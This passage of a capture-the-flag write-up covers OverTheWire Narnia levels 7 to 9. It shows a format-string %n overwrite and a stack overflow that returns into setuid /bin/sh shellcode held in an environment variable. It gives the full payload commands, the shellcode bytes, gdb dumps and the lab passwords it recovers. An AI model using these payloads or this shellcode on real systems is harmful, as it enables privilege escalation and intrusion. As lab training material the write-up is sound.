        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

When we execute the program, we land ont the *goodfunction()* but the program want us to execute the *hackedfunction()*. If we take a close look, we can see there is a *format string* vulnerability in the *snprintf()* function.

```bash
$ ./narnia7 ABCD
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

So, according to the program, we need to modify **prtf** with the address of *hackedfunction()* (`0x8048724`). To do that we need to write `0x8048724` at `0xffffd638` (*prtf()*). Since we don't really know where our input is placed on the stack, we'll just brutforce the position. Note that the value we'll write will be **134514464** (`134514468 (or 0x8048724) - 4 = 134514464`)

```bash
narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%1$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Segmentation fault
# Nope...

narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%2$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Way to go!!!!$
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
mohthuphog
``` 

On the second try !

## Решение Narnia 08

**SSH :** *ssh narnia8@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *mohthuphog*

First, let's try to execute the program...

```bash
$ ssh narnia8@narnia.labs.overthewire.org -p 2226

narnia8@narnia:~$ cd /narnia/
narnia8@narnia:/narnia$ ./narnia8
./narnia8 argument
narnia8@narnia:/narnia$ ./narnia8 test
test
```

The program just print back our input.

### Исходный код

Let's take a look at the source :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
```

Here we have a potential overflow in the **bok** variable, but if we try to overflow it we got some weird results :

```bash
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print 20 * "A"')
AAAAAAAAAAAAAAAAAAAA�������������
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print 21 * "A"')
Segmentation fault
```

We need to dig deeper, place a breakpoint at *printf()* in the *func()* function and run the code...

```nasm
narnia8@narnia:/narnia$ gdb narnia8

(gdb) set disassembly-flavor intel
(gdb) disas func
Dump of assembler code for function func:
   0x0804841b <+0>:	push   ebp
   0x0804841c <+1>:	mov    ebp,esp
   0x0804841e <+3>:	sub    esp,0x18
   0x08048421 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048424 <+9>:	mov    DWORD PTR [ebp-0x4],eax
   
...[removed]...

   0x0804847f <+100>:	push   eax
   0x08048480 <+101>:	push   0x8048550
   0x08048485 <+106>:	call   0x80482e0 <printf@plt>
   0x0804848a <+111>:	add    esp,0x8
   0x0804848d <+114>:	nop
   0x0804848e <+115>:	leave
   0x0804848f <+116>:	ret
End of assembler dump.

(gdb) break *func+106
Breakpoint 1 at 0x8048485

(gdb) run $(python -c 'print 20 * "A"')
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740

(gdb) run $(python -c 'print 21 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 21 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffc541
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740

(gdb) run $(python -c 'print 22 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 22 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd841
0xffffd67c:	0xffffd688	0x080484a7	0xffffd86f	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

As you can see, I increased the size of the input for each stack dump. The second one shows that we overwrote 1 byte of the 8th value (from `0xffffd871` to `0xffffc541`), but it seems that we can't overwrite more bytes...

We also note that the 8th and 11th values are the addresses of our input and the 10th value is the return address:

```nasm
(gdb) run $(python -c 'print 20 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
(gdb) x/s 0xffffd871
0xffffd871:	'A' <repeats 20 times>
```

Check the following dump, the address `0x080484a7` is in fact the return address to *main()* at the following line `0x080484a7 <+23>: add esp,0x4`.

```nasm
(gdb) run $(python -c 'print 20 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 2, 0x08048485 in func ()
(gdb) x/20xw $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
0xffffd6ac:	0x00000000	0x00000000	0x00000000	0xf7fc5000
(gdb) disas main
Dump of assembler code for function main:
   0x08048490 <+0>:	push   ebp
   0x08048491 <+1>:	mov    ebp,esp
   0x08048493 <+3>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048497 <+7>:	jle    0x80484ac <main+28>
   0x08048499 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804849c <+12>:	add    eax,0x4
   0x0804849f <+15>:	mov    eax,DWORD PTR [eax]
   0x080484a1 <+17>:	push   eax
   0x080484a2 <+18>:	call   0x804841b <func>
   0x080484a7 <+23>:	add    esp,0x4
   0x080484aa <+26>:	jmp    0x80484bf <main+47>
   0x080484ac <+28>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484af <+31>:	mov    eax,DWORD PTR [eax]
   0x080484b1 <+33>:	push   eax
   0x080484b2 <+34>:	push   0x8048554
   0x080484b7 <+39>:	call   0x80482e0 <printf@plt>
   0x080484bc <+44>:	add    esp,0x8
   0x080484bf <+47>:	mov    eax,0x0
   0x080484c4 <+52>:	leave
   0x080484c5 <+53>:	ret
End of assembler dump.
(gdb)
```

Okay, let's try to restore the original pointer to our string, here it's `0xffffd871` :

```nasm
(gdb) run $(python -c 'print 20 * "A"')
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

So, let's add 1 byte to the payload (`0x71`)

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x71"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x71"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffff4c71
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

Hum, the orginal address shifted down to `0xffffd870`, let's fix that :

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x70"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x70"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd870
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

So far, so good. Let's add a second byte, `0xd8` :

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x70\xd8"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x70\xd8"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd870
0xffffd67c:	0xffffd688	0x080484a7	0xffffd86f	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

Okay, the address shifted down again to `0xffffd86f`. I followed the pattern util I was able to to overwrite the address of our string and continue to write on the stack :

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x69\xd8\xff\xff" + "AAAA"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x69\xd8\xff\xff" + "AAAA"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd869
0xffffd67c:	0x41414141	0x080484a7	0xffffd869	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

The trick to remember is that you have to decrease the address of the string by 1 byte each time you add a byte to the payload. Let's finish that by overwriting the return address :

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x65\xd8\xff\xff" + "AAAA" + "CCCC"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x65\xd8\xff\xff" + "AAAA" + "CCCC"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd865
0xffffd67c:	0x41414141	0x43434343	0xffffd865	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAe���AAAACCCCe���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) x/x $eip
0x43434343:	Cannot access memory at address 0x43434343
```

Perfect ! Now, as the buffer is too small for a shellcode, we will use an environment variable and return to it. I used the following one :

```bash
export SHELLCODE=$(printf "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80")
```

Now, we'll try to execute it in GDB. Note, that the addresses might have shifted so make sure to repeat the previous steps to fix the addresses of our payload.

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x47\xd8\xff\xff" + "AAAA" + "CCCC"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x47\xd8\xff\xff" + "AAAA" + "CCCC"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd63c:	0x08048550	0xffffd644	0x41414141	0x41414141
0xffffd64c:	0x41414141	0x41414141	0x41414141	0xffffd847
0xffffd65c:	0x41414141	0x43434343	0xffffd847	0x00000000
0xffffd66c:	0xf7e2a286	0x00000002	0xffffd704	0xffffd710
```

Then, we will retreive our environment variable **SHELLCODE** by repeating the following command `x/s *((char **)environ)`.

```nasm
(gdb) x/s *((char **)environ)
0xffffd861:	"LC_ALL=en_US.UTF-8"

...[removed]...

(gdb) x/s *((char **)environ)
0xffffde75:	"LANG=en_US.UTF-8"
(gdb) x/s *((char **)environ)
0xffffde86:	"OLDPWD=/tmp"
(gdb) x/s *((char **)environ)
0xffffde92:	"SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
```

Finally, we complete the payload :

```nasm
(gdb) run $(python -c 'print 20 * "A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16xw $esp
0xffffd63c:	0x08048550	0xffffd644	0x41414141	0x41414141
0xffffd64c:	0x41414141	0x41414141	0x41414141	0xffffd840
0xffffd65c:	0x41414141	0xffffde92	0xffffd840	0x00000000
0xffffd66c:	0xf7e2a286	0x00000002	0xffffd704	0xffffd710
(gdb) conti
Continuing.
AAAAAAAAAAAAAAAAAAAA@���AAAA����@���
process 10478 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
$ 
```

Awesome, now we need to do the same outside GDB. First, let's find the **SHELLCODE** environment variable with the following code :

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

You can, compile it in **/tmp/** :

```bash
narnia8@narnia:/narnia$ cd /tmp
narnia8@narnia:/tmp$ gcc -m32 find_addr.c -o find_addr
narnia8@narnia:/tmp$ ./find_addr SHELLCODE
SHELLCODE is at 0xffffdea1
```

Then, we need to find the pointer of our payload :

```bash
narnia8@narnia:/narnia$ ./narnia8  $(python -c 'print 20 * "A"')  | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 6ad8 ffff 98d6 ffff a784 0408  AAAAj...........
00000020: 6ad8 ffff 0a                             j....
narnia8@narnia:/narnia$ python -c 'print "{:8x}".format(0xffffd86a-12)'
ffffd85e
./narnia8 $(python -c 'print 20 * "A" + "\x5e\xd8\xff\xff" + "AAAA" + "\xa1\xde\xff\xff"')
AAAAAAAAAAAAAAAAAAAA^���AAAA����^���
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

Finally ! This one was kind of hard. It took me a while to figure it out :)

## Решение Narnia 09

**SSH :** *ssh narnia9@narnia.labs.overthewire.org -p 2226*<br/>
**Pass :** *eiL5fealae*

Nothing to do here, we are done !
